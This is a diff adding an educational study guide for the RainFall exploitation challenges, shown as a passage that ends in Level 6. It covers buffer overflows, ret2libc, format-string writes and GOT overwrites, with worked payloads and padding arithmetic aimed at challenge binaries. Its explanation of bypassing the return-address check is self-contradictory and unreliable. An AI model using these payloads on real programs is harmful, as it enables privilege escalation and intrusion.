@@ -1,0 +1,1018 @@
+# RainFall - Complete Concepts Guide with Learning Resources
+
+## 📚 Table of Contents
+
+1. [Level 0 - Basic Binary Analysis](#level-0)
+2. [Level 1 - Buffer Overflow Basics](#level-1)
+3. [Level 2 - ret2libc & Bypass Protections](#level-2)
+4. [Level 3 - Format String Vulnerabilities](#level-3)
+5. [Level 4 - Advanced Format Strings](#level-4)
+6. [Level 5 - GOT Overwrite](#level-5)
+7. [Level 6 - Function Pointers](#level-6)
+8. [Level 7 - Advanced GOT & Memory Corruption](#level-7)
+9. [Level 8 - Heap Exploitation](#level-8)
+10. [Level 9 - C++ vtable Hijacking](#level-9)
+11. [Bonus Levels](#bonus-levels)
+
+---
+
+# Level 0 - Basic Binary Analysis
+
+## 🎯 Concepts Covered
+
+### 1. **SUID Binaries**
+
+**What is it?**
+SUID (Set User ID) is a special permission that allows a program to run with the privileges of the file owner, not the user running it.
+
+**Example:**
+```bash
+-rwsr-xr-x 1 level1 users 7355 level0
+# The 's' in 'rws' means SUID is set
+# This binary runs as 'level1' user
+```
+
+**Why it matters:**
+- Allows privilege escalation
+- Key to getting next level's password
+- Security risk if exploitable
+
+**Learn More:**
+- 📖 [Linux SUID Basics](https://www.redhat.com/sysadmin/suid-sgid-sticky-bit)
+- 📖 [SUID Security Implications](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)
+- 🎥 [YouTube: SUID Explained](https://www.youtube.com/results?search_query=linux+suid+explained)
+
+### 2. **Assembly Language Basics**
+
+**Key Concepts:**
+```nasm
+mov    eax, 5        ; Move 5 into EAX register
+cmp    eax, 0x1a7    ; Compare EAX with 0x1a7
+jne    0x8048f58     ; Jump if Not Equal
+call   0x8049710     ; Call function at address
+```
+
+**Registers (x86):**
+- **EAX**: Accumulator (return values, calculations)
+- **EBX**: Base register
+- **ECX**: Counter
+- **EDX**: Data register
+- **ESP**: Stack Pointer (top of stack)
+- **EBP**: Base Pointer (bottom of current frame)
+- **EIP**: Instruction Pointer (next instruction)
+
+**Learn More:**
+- 📖 [x86 Assembly Guide](https://www.cs.virginia.edu/~evans/cs216/guides/x86.html)
+- 📖 [Assembly Tutorial](https://www.tutorialspoint.com/assembly_programming/index.htm)
+- 🎥 [YouTube: x86 Assembly Crash Course](https://www.youtube.com/results?search_query=x86+assembly+tutorial)
+- 🛠️ Practice: [pwnable.kr - fd level](https://pwnable.kr/)
+
+### 3. **Integer Comparison in Assembly**
+
+**How it works:**
+```nasm
+; Example from level0
+call   atoi           ; Convert string to integer
+cmp    eax, 0x1a7     ; Compare result with 423 (decimal)
+jne    failure        ; If not equal, jump to failure
+; Success code here
+```
+
+**Common Comparison Instructions:**
+- `cmp a, b` - Compare a with b
+- `je` / `jne` - Jump if Equal / Not Equal
+- `jg` / `jl` - Jump if Greater / Less
+- `jge` / `jle` - Jump if Greater/Equal or Less/Equal
+
+**Learn More:**
+- 📖 [Comparison and Branching](https://www.cs.princeton.edu/courses/archive/spr11/cos217/lectures/15AssemblyFunctions.pdf)
+- 📖 [Jump Instructions Reference](https://www.unixwiz.net/techtips/x86-jumps.html)
+
+### 4. **GDB (GNU Debugger)**
+
+**Essential Commands:**
+```bash
+gdb ./level0                    # Start GDB
+disas main                      # Disassemble main function
+break *0x08048484              # Set breakpoint at address
+run 423                        # Run with argument
+info registers                 # Show all registers
+x/20wx $esp                    # Examine stack memory
+ni                             # Next instruction
+si                             # Step into function
+```
+
+**Learn More:**
+- 📖 [GDB Tutorial](https://www.cs.cmu.edu/~gilpin/tutorial/)
+- 📖 [GDB Cheat Sheet](https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf)
+- 🎥 [YouTube: GDB Debugging Tutorial](https://www.youtube.com/results?search_query=gdb+tutorial)
+- 🛠️ Interactive: [GDB Online](https://www.onlinegdb.com/)
+
+### 5. **Number Base Conversion**
+
+**Hexadecimal to Decimal:**
+```python
+0x1a7 = (1 × 16²) + (10 × 16¹) + (7 × 16⁰)
+      = 256 + 160 + 7
+      = 423
+```
+
+**Quick conversions:**
+```bash
+# Python
+python -c "print(0x1a7)"        # Output: 423
+python -c "print(hex(423))"     # Output: 0x1a7
+
+# Calculator (bc)
+echo "ibase=16; 1A7" | bc       # Output: 423
+```
+
+**Learn More:**
+- 📖 [Number Systems Guide](https://www.electronics-tutorials.ws/binary/bin_3.html)
+- 🎮 Practice: [Hex Game](https://learningcontent.cisco.com/games/binary/index.html)
+
+---
+
+# Level 1 - Buffer Overflow Basics
+
+## 🎯 Concepts Covered
+
+### 1. **Stack Memory Layout**
+
+**Visual Representation:**
+```
+High Memory Addresses
++------------------+
+|   Arguments      |  <- argv, argc
++------------------+
+|   Return Addr    |  <- EIP will jump here (TARGET!)
++------------------+
+|   Saved EBP      |  <- Previous stack frame
++------------------+
+|   Local Vars     |  <- Your buffer is here
+|   (buffer[76])   |
++------------------+
+|   ...            |
++------------------+  <- ESP (Stack Pointer)
+Low Memory Addresses
+
+Stack grows DOWN (towards lower addresses)
+```
+
+**Key Points:**
+- Stack grows downward (high → low addresses)
+- Return address is stored on stack
+- Buffer overflow can overwrite return address
+- When function returns, jumps to return address
+
+**Learn More:**
+- 📖 [Stack Memory Explained](https://www.tenouk.com/Bufferoverflowc/Bufferoverflow2a.html)
+- 📖 [Call Stack Visualization](https://en.wikipedia.org/wiki/Call_stack)
+- 🎥 [YouTube: Stack Memory Explained](https://www.youtube.com/results?search_query=stack+memory+explained)
+- 🎮 Interactive: [Stack Visualizer](https://www.cs.usfca.edu/~galles/visualization/StackLL.html)
+
+### 2. **Buffer Overflow Vulnerability**
+
+**What is it?**
+When you write more data to a buffer than it can hold, overwriting adjacent memory.
+
+**Vulnerable Code:**
+```c
+char buffer[76];
+gets(buffer);  // DANGEROUS! No bounds checking
+```
+
+**Why gets() is dangerous:**
+- Reads unlimited input
+- No size limit
+- Will keep writing past buffer end
+- Can overwrite return address
+
+**Safe Alternatives:**
+```c
+// BAD
+gets(buffer);
+
+// GOOD
+fgets(buffer, sizeof(buffer), stdin);
+read(0, buffer, sizeof(buffer));
+```
+
+**Exploitation:**
+```
+Input: "AAAA..." (80 bytes) + "\x44\x84\x04\x08" (return address)
+       [----76 bytes----][--4--][------4 bytes------]
+        Fill buffer      EBP     Overwrite ret addr
+```
+
+**Learn More:**
+- 📖 **[Smashing The Stack For Fun And Profit](http://www-inst.eecs.berkeley.edu/~cs161/fa08/papers/stack_smashing.pdf)** ⭐ MUST READ
+- 📖 [Buffer Overflow Tutorial](https://www.sans.org/reading-room/whitepapers/threats/buffer-overflow-attacks-1336)
+- 🎥 [YouTube: Buffer Overflow Explained](https://www.youtube.com/results?search_query=buffer+overflow+explained)
+- 🛠️ Practice: [OverTheWire Narnia](https://overthewire.org/wargames/narnia/)
+
+### 3. **Finding Offsets**
+
+**Method 1: Pattern Creation (PEDA)**
+```bash
+gdb ./level1
+(gdb) pattern create 200
+# Copy the pattern
+(gdb) run
+# Program crashes
+(gdb) pattern offset $eip
+# Shows exact offset: 76
+```
+
+**Method 2: Manual Calculation**
+```bash
+(gdb) disas main
+   ...
+   0x08048483 <+3>:  sub    esp,0x50    # 0x50 = 80 bytes allocated
+   
+# Stack layout:
+# 80 bytes total - 4 bytes (EBP) = 76 bytes to return address
+```
+
+**Method 3: Trial and Error**
+```python
+# Try different offsets
+for i in range(50, 100):
+    payload = "A" * i + "BBBB"
+    # Run and check if EIP = 0x42424242 (BBBB)
+```
+
+**Learn More:**
+- 📖 [Finding Buffer Offsets](https://ir0nstone.gitbook.io/notes/types/stack/finding-the-offset)
+- 🛠️ Tool: [msf-pattern_create](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom)
+
+### 4. **Little-Endian Format**
+
+**What is it?**
+Byte ordering where the least significant byte is stored first.
+
+**Example:**
+```
+Address: 0x08048444
+
+Big-Endian:    08 04 84 44
+Little-Endian: 44 84 04 08  ← x86 uses this!
+
+In Python: "\x44\x84\x04\x08"
+```
+
+**Why it matters:**
+```python
+# WRONG
+payload = "A" * 76 + "\x08\x04\x84\x44"
+
+# CORRECT
+payload = "A" * 76 + "\x44\x84\x04\x08"
+```
+
+**Quick Conversion:**
+```python
+import struct
+
+# Address to little-endian
+addr = 0x08048444
+little_endian = struct.pack("<I", addr)
+print(repr(little_endian))  # '\x44\x84\x04\x08'
+
+# Little-endian to address
+bytes_data = "\x44\x84\x04\x08"
+address = struct.unpack("<I", bytes_data)[0]
+print(hex(address))  # 0x8048444
+```
+
+**Learn More:**
+- 📖 [Endianness Explained](https://betterexplained.com/articles/understanding-big-and-little-endian-byte-order/)
+- 📖 [Why Little-Endian?](https://softwareengineering.stackexchange.com/questions/95556/why-is-little-endian-used-by-x86)
+- 🎥 [YouTube: Endianness Tutorial](https://www.youtube.com/results?search_query=little+endian+explained)
+
+### 5. **Control Flow Hijacking**
+
+**Normal Flow:**
+```
+main() → calls function → function returns → continues in main
+```
+
+**Exploited Flow:**
+```
+main() → calls function → buffer overflow → returns to run() → shell!
+```
+
+**How it works:**
+```nasm
+; End of vulnerable function
+mov    esp, ebp
+pop    ebp
+ret               ; Pops return address and jumps to it
+                 ; We control this address!
+```
+
+**Learn More:**
+- 📖 [Control Flow Hijacking](https://www.infosecinstitute.com/resources/hacking/buffer-overflow-part-two/)
+- 📖 [Return Address Overwrite](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)
+
+---
+
+# Level 2 - ret2libc & Bypass Protections
+
+## 🎯 Concepts Covered
+
+### 1. **Non-Executable Stack (NX/DEP)**
+
+**What is it?**
+Security mechanism that marks stack memory as non-executable.
+
+**Check if enabled:**
+```bash
+checksec ./level2
+# Output: NX enabled
+
+readelf -l level2 | grep STACK
+# GNU_STACK ... RW  (Read-Write, not Execute)
+```
+
+**Impact:**
+- Can't execute shellcode on stack
+- Need alternative exploitation method
+- ret2libc is the solution
+
+**Learn More:**
+- 📖 [DEP/NX Explained](https://www.sans.org/reading-room/whitepapers/vulnerabilities/defeating-windows-non-executable-stack-protection-33644)
+- 📖 [Stack Protection Methods](https://en.wikipedia.org/wiki/Executable_space_protection)
+- 🎥 [YouTube: NX Bit Explained](https://www.youtube.com/results?search_query=nx+bit+explained)
+
+### 2. **ret2libc (Return-to-libc)**
+
+**Concept:**
+Instead of executing shellcode, reuse existing code from libc library.
+
+**Strategy:**
+```
+Overflow buffer → Overwrite return address → Jump to system() → 
+Pass "/bin/sh" as argument → Get shell!
+```
+
+**Stack Layout for ret2libc:**
+```
++------------------+
+| "/bin/sh" addr   | ← Argument to system()
++------------------+
+| Fake return addr | ← Where system() returns (we don't care)
++------------------+
+| system() address | ← Return address (jump here first!)
++------------------+
+| Saved EBP        |
++------------------+
+| Buffer overflow  |
++------------------+
+```
+
+**Why it works:**
+```c
+// We're essentially creating this call:
+system("/bin/sh");
+
+// On stack:
+// [system_addr][fake_ret][binsh_addr]
+//     ↓
+// Call system() with argument at binsh_addr
+```
+
+**Learn More:**
+- 📖 **[ret2libc Explanation](https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf)** ⭐ EXCELLENT
+- 📖 [Return-to-libc Attack](https://samsclass.info/127/proj/p3-lbuf1.htm)
+- 🎥 [YouTube: ret2libc Tutorial](https://www.youtube.com/results?search_query=ret2libc+tutorial)
+- 🛠️ Practice: [ROP Emporium - ret2win](https://ropemporium.com/)
+
+### 3. **Finding libc Functions**
+
+**Method 1: GDB**
+```bash
+gdb ./level2
+(gdb) break main
+(gdb) run
+(gdb) print system
+$1 = {<text variable>} 0xb7e6b060 <system>
+
+(gdb) print __libc_system
+$2 = {<text variable>} 0xb7e6b060 <__libc_system>
+```
+
+**Method 2: Find "/bin/sh" string**
+```bash
+(gdb) find &system,+9999999,"/bin/sh"
+0xb7f8cc58
+warning: Unable to access target memory at 0xb7fd3160, halting search.
+1 pattern found.
+
+(gdb) x/s 0xb7f8cc58
+0xb7f8cc58:      "/bin/sh"
+```
+
+**Method 3: Using ldd**
+```bash
+ldd ./level2
+    linux-gate.so.1 =>  (0xb7fda000)
+    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e2c000)
+```
+
+**Learn More:**
+- 📖 [Finding libc Addresses](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2libc)
+- 📖 [Dynamic Linking Explained](https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html)
+
+### 4. **Bypassing Address Checks**
+
+**The Protection:**
+```c
+void p(void) {
+    unsigned int ret_addr;
+    char buffer[76];
+    
+    gets(buffer);
+    ret_addr = __builtin_return_address(0);
+    
+    // Check if return address is on stack (0xbXXXXXXX)
+    if ((ret_addr & 0xb0000000) == 0xb0000000) {
+        printf("(%p)\n", ret_addr);
+        exit(1);  // Prevent stack execution
+    }
+}
+```
+
+**Why ret2libc bypasses it:**
+- system() is in libc, not on stack
+- Address like 0xb7e6b060 fails the check BUT
+- We're not returning there directly from overflow
+- We're using it as a function call target
+
+**Learn More:**
+- 📖 [Bypassing Stack Protection](https://www.exploit-db.com/papers/13218)
+
+### 5. **Function Calling Convention (x86)**
+
+**cdecl Convention:**
+```
+1. Arguments pushed right-to-left
+2. Call instruction
+3. Return value in EAX
+4. Caller cleans up stack
+```
+
+**Example:**
+```c
+system("/bin/sh");
+
+// On stack:
+push "/bin/sh" address
+call system
+```
+
+**In ret2libc:**
+```
+Stack:
++------------------+
+| "/bin/sh" addr   | ← First argument (offset +8 from ret addr)
++------------------+
+| Fake return      | ← Where to return after system() (+4)
++------------------+
+| system() addr    | ← EIP jumps here
++------------------+
+```
+
+**Learn More:**
+- 📖 [Calling Conventions](https://en.wikipedia.org/wiki/X86_calling_conventions)
+- 📖 [cdecl Explained](https://www.cs.virginia.edu/~evans/cs216/guides/x86.html#calling)
+- 🎥 [YouTube: x86 Calling Convention](https://www.youtube.com/results?search_query=x86+calling+convention)
+
+---
+
+# Level 3 - Format String Vulnerabilities
+
+## 🎯 Concepts Covered
+
+### 1. **How printf() Works**
+
+**Normal Usage:**
+```c
+printf("Hello %s, you are %d years old\n", name, age);
+//     ^format string^              ^arguments from stack^
+```
+
+**Under the Hood:**
+```
+Stack:
++------------------+
+| age (25)         | ← %d reads this
++------------------+
+| name pointer     | ← %s reads this
++------------------+
+| format string    |
++------------------+
+```
+
+**Vulnerable Usage:**
+```c
+char buffer[512];
+fgets(buffer, 512, stdin);
+printf(buffer);  // DANGEROUS! User controls format string
+```
+
+**Learn More:**
+- 📖 [printf() internals](https://www.cprogramming.com/tutorial/printf-format-strings.html)
+- 📖 [Format String Basics](https://cs155.stanford.edu/papers/formatstring-1.2.pdf)
+
+### 2. **Format String Vulnerability**
+
+**The Problem:**
+```c
+// VULNERABLE
+printf(user_input);
+
+// SAFE
+printf("%s", user_input);
+```
+
+**Why it's dangerous:**
+```bash
+# Normal
+$ echo "Hello" | ./level3
+Hello
+
+# Exploitation
+$ echo "%x %x %x" | ./level3
+200 b7fd1ac0 b7ff37d0  # Leaks stack values!
+```
+
+**What you can do:**
+1. **Read memory** using %x, %s, %p
+2. **Write memory** using %n
+3. **Crash program** with invalid formats
+
+**Learn More:**
+- 📖 **[Format String Exploitation](https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf)** ⭐ MUST READ
+- 📖 [Format String Attack](https://owasp.org/www-community/attacks/Format_string_attack)
+- 🎥 [YouTube: Format String Vulnerability](https://www.youtube.com/results?search_query=format+string+vulnerability)
+- 🛠️ Practice: [pwnable.kr - passcode](https://pwnable.kr/)
+
+### 3. **Format Specifiers**
+
+**Common Specifiers:**
+```c
+%d    // Decimal integer
+%x    // Hexadecimal
+%s    // String (reads pointer)
+%p    // Pointer address
+%n    // WRITE number of bytes printed so far to address!
+%hn   // Write as short (2 bytes)
+%hhn  // Write as byte (1 byte)
+```
+
+**Reading Stack:**
+```bash
+# Test input
+echo "AAAA.%x.%x.%x.%x" | ./level3
+
+# Output
+AAAA.200.b7fd1ac0.b7ff37d0.41414141
+#                            ^^^^^^^^
+#                            Our "AAAA" (0x41 = 'A')
+```
+
+**Direct Parameter Access:**
+```bash
+# Instead of %x %x %x %x to reach 4th parameter:
+echo "%4$x" | ./level3
+41414141  # Directly reads 4th parameter
+```
+
+**Learn More:**
+- 📖 [Format Specifier Reference](https://www.cplusplus.com/reference/cstdio/printf/)
+- 📖 [Format String Cheat Sheet](https://cs155.stanford.edu/papers/formatstring-1.2.pdf)
+
+### 4. **The %n Specifier (Writing Memory)**
+
+**What %n does:**
+Writes the number of bytes printed SO FAR to the address pointed to by the argument.
+
+**Example:**
+```c
+int count;
+printf("Hello%n", &count);
+// count now contains 5 (length of "Hello")
+```
+
+**Exploitation:**
+```python
+# Goal: Write 64 to address 0x0804988c
+
+# Address of variable 'm'
+addr = "\x8c\x98\x04\x08"
+
+# We need to print 64 bytes total before %n
+# Address itself is 4 bytes, so need 60 more
+padding = "%60x"  # Prints 60 characters
+
+# Direct parameter access (say 4th position)
+write = "%4$n"
+
+payload = addr + padding + write
+```
+
+**How it works:**
+```
+1. "\x8c\x98\x04\x08" - Address pushed to stack (4 bytes printed)
+2. "%60x" - Prints 60 more characters (total: 64 bytes)
+3. "%4$n" - Writes 64 to address at 4th parameter
+```
+
+**Learn More:**
+- 📖 [%n Exploitation](https://ir0nstone.gitbook.io/notes/types/stack/format-string)
+- 🎥 [YouTube: Format String %n](https://www.youtube.com/results?search_query=format+string+%25n)
+
+### 5. **Finding Stack Offset**
+
+**Goal:** Find where your input appears on the stack
+
+**Method:**
+```bash
+# Put recognizable pattern at start
+echo "AAAA.%x.%x.%x.%x.%x.%x" | ./level3
+
+# Output example:
+AAAA.200.b7fd1ac0.b7ff37d0.41414141.2e78252e
+#                            ^^^^^^^^
+#                            This is our "AAAA" (0x41414141)
+#                            It's at position 4!
+```
+
+**Testing:**
+```bash
+# Verify with direct access
+echo "AAAA%4$x" | ./level3
+# Should output: AAAA41414141
+```
+
+**Learn More:**
+- 📖 [Finding Format String Offset](https://ir0nstone.gitbook.io/notes/types/stack/format-string/exploiting)
+
+---
+
+# Level 4 - Advanced Format Strings
+
+## 🎯 Concepts Covered
+
+### 1. **Writing Large Values**
+
+**Challenge:**
+Need to write a large number (like 0x01025544) without printing millions of characters.
+
+**Solution: Split into Multiple Writes**
+```python
+# Target: Write 0x01025544 to address 0x08049810
+
+# Split into 2 shorts:
+# Low:  0x5544 = 21828 decimal
+# High: 0x0102 = 258 decimal
+
+# Write to two adjacent addresses:
+addr_low = "\x10\x98\x04\x08"   # 0x08049810
+addr_high = "\x12\x98\x04\x08"  # 0x08049812
+
+# But 258 < 21828, so we need to wrap around
+# Use 0x10102 instead: 65538 decimal
+# 65538 - 21828 = 43710
+
+payload = addr_low + addr_high
+payload += "%21820x"    # Print 21820 (21828 - 8 for addresses)
+payload += "%4$hn"      # Write to low address
+payload += "%43710x"    # Print additional 43710
+payload += "%5$hn"      # Write to high address
+```
+
+**Learn More:**
+- 📖 [Writing Arbitrary Values](https://www.ret2rop.com/2018/08/make-stack-great-again-part-1.html)
+
+### 2. **Precision Padding**
+
+**Using Width Specifier:**
+```c
+printf("%10x", 5);     // "         5" (10 characters)
+printf("%100x", 5);    // "   ...   5" (100 characters)
+```
+
+**In Exploitation:**
+```python
+# Need to print exactly N bytes before %n
+target_value = 1234
+already_printed = 8  # Two addresses
+
+padding = target_value - already_printed
+payload = addresses + "%%%dx" % padding + "%4$n"
+```
+
+**Learn More:**
+- 📖 [Format String Precision](https://cplusplus.com/reference/cstdio/printf/)
+
+### 3. **Multiple Writes in One Payload**
+
+**Strategy:**
+```
+1. Place all addresses first
+2. Calculate padding for each write
+3. Use %hn for 2-byte writes
+4. Reference correct parameter positions
+```
+
+**Example:**
+```python
+# Four addresses (16 bytes)
+addrs = "\x10\x98\x04\x08"  # Position 4
+addrs += "\x12\x98\x04\x08"  # Position 5
+addrs += "\x14\x98\x04\x08"  # Position 6
+addrs += "\x16\x98\x04\x08"  # Position 7
+
+# Write different values to each
+payload = addrs
+payload += "%50x%4$hhn"   # Write 50+16=66 to first
+payload += "%100x%5$hhn"  # Write 66+100=166 to second
+# etc...
+```
+
+**Learn More:**
+- 📖 [Advanced Format String](https://www.exploit-db.com/papers/13228)
+
+---
+
+# Level 5 - GOT Overwrite
+
+## 🎯 Concepts Covered
+
+### 1. **GOT (Global Offset Table)**
+
+**What is GOT?**
+Table that stores addresses of dynamically linked functions.
+
+**Why it exists:**
+- Shared libraries (libc) can be loaded at different addresses
+- GOT provides a level of indirection
+- Programs look up function addresses in GOT at runtime
+
+**Visual:**
+```
+Program calls printf()
+    ↓
+Jumps to PLT (Procedure Linkage Table)
+    ↓
+PLT looks up address in GOT
+    ↓
+Jumps to actual printf() in libc
+```
+
+**Learn More:**
+- 📖 **[PLT and GOT Explained](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html)** ⭐ EXCELLENT
+- 📖 [Understanding GOT/PLT](https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html)
+- 🎥 [YouTube: GOT/PLT Explained](https://www.youtube.com/results?search_query=got+plt+explained)
+
+### 2. **Finding GOT Entries**
+
+**Method 1: objdump**
+```bash
+objdump -R ./level5
+
+OFFSET   TYPE              VALUE
+08049804 R_386_JUMP_SLOT   printf
+0804980c R_386_JUMP_SLOT   fgets
+08049810 R_386_JUMP_SLOT   system
+0804981c R_386_JUMP_SLOT   exit    ← Target this!
+```
+
+**Method 2: readelf**
+```bash
+readelf -r ./level5
+
+Relocation section '.rel.plt':
+ Offset     Info    Type            Sym.Value  Sym. Name
+0804981c  00000407 R_386_JUMP_SLOT   00000000   exit
+```
+
+**Method 3: GDB**
+```bash
+gdb ./level5
+(gdb) disas exit
+# Shows PLT stub
+
+(gdb) x/wx 0x0804981c
+0x804981c <exit@got.plt>:    0xb7e5ebe0
+```
+
+**Learn More:**
+- 📖 [Finding GOT Entries](https://ir0nstone.gitbook.io/notes/types/stack/format-string/got-overwrite)
+
+### 3. **GOT Overwrite Attack**
+
+**Strategy:**
+1. Find GOT entry of a function that will be called
+2. Overwrite it with address of target function
+3. When program calls original function, it jumps to our target
+
+**Example:**
+```
+Program flow:
+main() → ... → exit() → program ends
+
+After GOT overwrite:
+main() → ... → exit@GOT → actually jumps to o() → shell!
+```
+
+**Why it works:**
+- GOT is writable (by design)
+- Format string gives us write primitive
+- Can overwrite any GOT entry
+
+**Learn More:**
+- 📖 [GOT Overwrite Technique](https://www.ret2rop.com/2018/08/make-stack-great-again-part-2.html)
+- 🛠️ Practice: [pwnable.tw - Formatted String](https://pwnable.tw/)
+
+### 4. **Calculating GOT Overwrite**
+
+**Goal:** Write address 0x080484a4 to GOT entry at 0x0804981c
+
+**Split into shorts:**
+```python
+target_addr = 0x080484a4
+got_entry = 0x0804981c
+
+# Split target into 2 shorts (16-bit values)
+low_short = target_addr & 0xFFFF          # 0x84a4 = 33956
+high_short = (target_addr >> 16) & 0xFFFF # 0x0804 = 2052
+
+# Write to two addresses:
+got_low = got_entry      # 0x0804981c (writes low 2 bytes)
+got_high = got_entry + 2 # 0x0804981e (writes high 2 bytes)
+
+# Problem: 2052 < 33956 (can't go backwards!)
+# Solution: Write 0x10804 instead (65536 + 2052 = 67588)
+
+# Payload:
+payload = struct.pack('<I', got_low)   # 4 bytes
+payload += struct.pack('<I', got_high) # 4 bytes (8 total)
+
+# Write 33956 (including 8 bytes already printed)
+payload += "%33948x"  # 33956 - 8 = 33948
+payload += "%4$hn"    # Write to position 4 (got_low)
+
+# Write 67588 (difference: 67588 - 33956 = 33632)
+payload += "%33632x"
+payload += "%5$hn"    # Write to position 5 (got_high)
+```
+
+**Step-by-step breakdown:**
+1. Print 8 bytes (two addresses)
+2. Print 33948 more = 33956 total → write to low bytes
+3. Print 33632 more = 67588 total → write to high bytes
+4. High bytes: 67588 & 0xFFFF = 0x10804 → 0x0804 in memory
+
+**Learn More:**
+- 📖 [Format String Arithmetic](https://ir0nstone.gitbook.io/notes/types/stack/format-string/arbitrary-write)
+
+### 5. **Lazy Binding**
+
+**Concept:**
+Functions aren't resolved until first called.
+
+**First call:**
+```
+1. Call printf@PLT
+2. PLT checks GOT entry
+3. GOT contains resolver address
+4. Resolver finds real printf() in libc
+5. GOT entry updated with real address
+6. Jump to printf()
+```
+
+**Subsequent calls:**
+```
+1. Call printf@PLT
+2. PLT checks GOT entry
+3. GOT has real address → jump directly
+```
+
+**Exploitation Impact:**
+- GOT entries are writeable
+- Overwrite them to hijack function calls
+- Works for any dynamically linked function
+
+**Learn More:**
+- 📖 [Dynamic Linking Deep Dive](https://www.airs.com/blog/archives/38)
+- 🎥 [YouTube: Dynamic Linking Explained](https://www.youtube.com/results?search_query=dynamic+linking+explained)
+
+---
+
+# Level 6 - Function Pointers
+
+## 🎯 Concepts Covered
+
+### 1. **Function Pointers in C**
+
+**What are they?**
+Variables that store addresses of functions.
+
+**Example:**
+```c
+void hello() {
+    printf("Hello!\n");
+}
+
+void goodbye() {
+    printf("Goodbye!\n");
+}
+
+int main() {
+    void (*func_ptr)();  // Declare function pointer
+    
+    func_ptr = hello;    // Point to hello
+    func_ptr();          // Calls hello()
+    
+    func_ptr = goodbye;  // Point to goodbye
+    func_ptr();          // Calls goodbye()
+}
+```
+
+**In Memory:**
+```
++------------------+
+| func_ptr         | Contains: 0x08048444 (address of hello)
++------------------+
+
+When you call func_ptr():
+- Jumps to address stored in func_ptr
+- Executes function there
+```
+
+**Learn More:**
+- 📖 [Function Pointers Tutorial](https://www.cprogramming.com/tutorial/function-pointers.html)
+- 📖 [Function Pointers Explained](https://www.geeksforgeeks.org/function-pointer-in-c/)
+- 🎥 [YouTube: C Function Pointers](https://www.youtube.com/results?search_query=c+function+pointers+tutorial)
+
+### 2. **Array of Function Pointers**
+
+**Common Pattern:**
+```c
+void func0() { /* ... */ }
+void func1() { /* ... */ }
+void func2() { /* ... */ }
+
+void (*funcs[3])() = {func0, func1, func2};
+
+// Call based on index
+int index = get_user_input();
+funcs[index]();  // DANGEROUS if index not validated!
+```
+
+**Exploitation:**
+```c
+void (*funcs[5])();
+int index;
+
+scanf("%d", &index);  // User controls index!
+funcs[index]();       // Can call ANY address!
+
+// If we know address of hidden function:
+// Input: (addr - array_base) / sizeof(pointer)
+// We jump to our target!
+```
+
+**Learn More:**
+- 📖 [Array of Function Pointers](https://www.geeksforgeeks.org/array-of-function-pointers-in-c/)
+
+### 3. **Memory Layout of Arrays**
+
+**Array in Memory:**
+```c
+int array[5] = {1, 2, 3, 4, 5};
+
+Memory:
++--------+--------+--------+--------+--------+
+| array[0] | array[1] | array[2] | array[3] | array[4] |
+| 1      | 2      | 3      | 4      | 5      |
++--------+--------+--------+--------+--------+
+0x1000   0x1004   0x1008   0x100C   0x1010
+
+array[0] is at array + 0
+array[1] is at array + 4  (4 bytes per int)
+array[n] is at array + (n * 4)
+```
+
+**For Function Pointers:**
+```c
+void (*funcs[5])();
+
+Memory (32-bit):
++--------+--------+--------+--------+--------+
+| funcs[0] | funcs[1] | funcs[2] | funcs[3] | funcs[4] |
+| 0x08... | 0x08... | 0x08... | 0x08... | 0x08... |
++--------+--------+--------+--------+--------+
